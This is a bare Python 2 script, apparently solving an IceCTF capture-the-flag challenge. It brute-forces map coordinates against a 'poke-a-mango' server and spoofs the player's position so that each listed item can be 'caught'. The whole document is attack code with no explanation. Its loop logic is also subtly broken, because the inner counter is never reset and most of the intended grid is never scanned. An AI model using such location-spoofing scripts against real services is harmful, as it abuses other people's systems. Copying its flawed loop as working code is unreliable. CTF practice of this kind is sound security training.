import requests
import json

i = 0
j = 0
n = 180
while i < n:
    i = i + 0.5
    while j < n:
        j = j + 0.5
        HTTP = requests.post("http://poke-a-mango.vuln.icec.tf/mango/list", data = {"uuid": "121212121238400000-8cf0-11bd-b23e-10b96e4ef00d", "lat":i,"long":j})
        parsed1 = json.loads(HTTP.text)
        for text in parsed1["mangos"]:
            print str(text["lat"])+"_"+str(text['lng'])
            post_data = {"uuid": "121212121238400000-8cf0-11bd-b23e-10b96e4ef00d", "curLat":str(text["lat"]),"curLong":str(text['lng']), "mangoLat" : str(text["lat"]),"mangoLong": str(text['lng'])}
            HTTP = requests.post("http://poke-a-mango.vuln.icec.tf/mango/catch", data = post_data)
            print HTTP.text